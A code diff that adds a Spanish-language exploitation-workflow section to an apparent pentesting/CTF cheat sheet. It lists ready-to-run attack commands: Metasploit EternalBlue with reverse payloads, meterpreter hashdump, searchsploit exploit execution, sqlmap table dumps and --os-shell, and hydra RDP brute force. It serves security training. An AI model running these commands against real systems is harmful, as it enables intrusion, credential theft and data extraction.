@@ -661,6 +661,85 @@ rdesktop <IP> -u <usuario> -p <pass>`},
         {p:"Fuerza bruta de RDP", code:`hydra -L usuarios.txt -P rockyou.txt rdp://<IP>`}
       ]}
     ]
+  },
+  {
+    id:"flujo", title:"⚔️ Flujo de Explotación",
+    sections:[
+      {h:"Idea base (antes de tirar nada)", blocks:[
+        {p:"CVE = nombre de la vuln · exploit/módulo = el código que la aprovecha", code:`# searchsploit BUSCA el exploit
+# msfconsole lo EJECUTA (use -> set -> run)
+# sqlmap automatiza SQL Injection
+# Regla: ¿msf tiene el módulo? -> usalo. ¿No? -> searchsploit + manual`},
+        {p:"Primero recon siempre: sin servicio/parámetro no hay nada que explotar", code:`nmap -p- --min-rate=1000 -T4 <IP>
+nmap -sC -sV -p<puertos> <IP> -oN nmap_detallado.txt
+# web con parámetro (?id=, login, buscador) -> candidato a sqlmap`}
+      ]},
+      {h:"msfconsole — flujo base", blocks:[
+        {p:"Arrancar limpio (sin banner)", code:`msfconsole -q`},
+        {p:"Buscar y cargar el módulo", code:`search ms17_010
+search type:exploit platform:linux <servicio>
+search cve:<año>-<numero>
+use exploit/windows/smb/ms17_010_eternalblue   # o use 0
+info`},
+        {p:"Ver y setear lo obligatorio (RHOST = ellos, LHOST = vos)", code:`show options
+set RHOSTS <IP_victima>
+set LHOST tun0            # tu IP de la VPN
+set LPORT 4444
+set PAYLOAD <payload>     # ver opciones con show payloads
+setg LHOST tun0          # setg = global, queda para todos los módulos`},
+        {p:"Verificar y lanzar", code:`check
+run          # o exploit / exploit -j (en background)`},
+        {p:"Sesiones", code:`sessions
+sessions -i 1
+background         # o Ctrl+Z
+sessions -u <id>   # upgrade a meterpreter`},
+        {p:"Meterpreter — básicos", code:`getuid
+sysinfo
+shell
+hashdump
+search -f flag.txt`},
+        {p:"Si run falla", code:`# casi siempre RHOSTS/LHOST mal o PAYLOAD incompatible
+show options     # revisá lo que quedó seteado
+show payloads    # probá otro payload`},
+        {p:"Si caés sin privilegios (no root/SYSTEM)", code:`background
+use post/multi/recon/local_exploit_suggester
+set SESSION <id>
+run`}
+      ]},
+      {h:"searchsploit — cuando el exploit NO está en msf", blocks:[
+        {p:"Buscar por servicio + versión", code:`searchsploit drupal 7
+searchsploit apache 2.4`},
+        {p:"Copiar el exploit a tu carpeta y leerlo", code:`searchsploit -m php/webapps/44448.rb
+cat 44448.rb`},
+        {p:"Correrlo a mano (según el lenguaje del archivo)", code:`python3 exploit.py <args>
+ruby 44448.rb <args>
+./exploit.sh <args>`},
+        {p:"Flags útiles", code:`searchsploit <servicio> <version>   # buscar
+searchsploit -m <ruta>              # copiar (mirror) a tu dir
+searchsploit -x <ruta>              # examinar/abrir
+searchsploit -u                     # actualizar la base`}
+      ]},
+      {h:"sqlmap — SQL Injection automatizada", blocks:[
+        {p:"Detectar y enumerar bases (parámetro GET)", code:`sqlmap -u "http://<IP>/page.php?id=1" --batch --dbs`},
+        {p:"Bajar en cascada: tablas -> columnas -> datos", code:`sqlmap -u "..." -D <base> --tables
+sqlmap -u "..." -D <base> -T users --columns
+sqlmap -u "..." -D <base> -T users --dump`},
+        {p:"POST / login (request capturada con Burp)", code:`sqlmap -r request.txt --batch --dbs
+# o sin Burp, pasando el body a mano:
+sqlmap -u "http://<IP>/login.php" --data="user=admin&pass=test" --batch --dbs`},
+        {p:"Flags útiles", code:`--batch                  # responde todo con el default
+-p "id,user"             # forzar qué parámetros testear
+--cookie="PHPSESSID=..." # mandar sesión
+--level=5 --risk=3       # más agresivo (más lento/ruidoso)
+--os-shell               # intentar shell en el server`}
+      ]},
+      {h:"Qué usar según lo que encontrás", blocks:[
+        {p:"Regla rápida de decisión", code:`# Servicio/versión vulnerable CON módulo en msf -> msfconsole
+# Vuln SIN módulo en msf                        -> searchsploit + manual
+# Parámetro web (?id=, login, buscador)         -> sqlmap
+# En todos: objetivo = shell -> flag -> (si hace falta) privesc`}
+      ]}
+    ]
   }
 ];
  
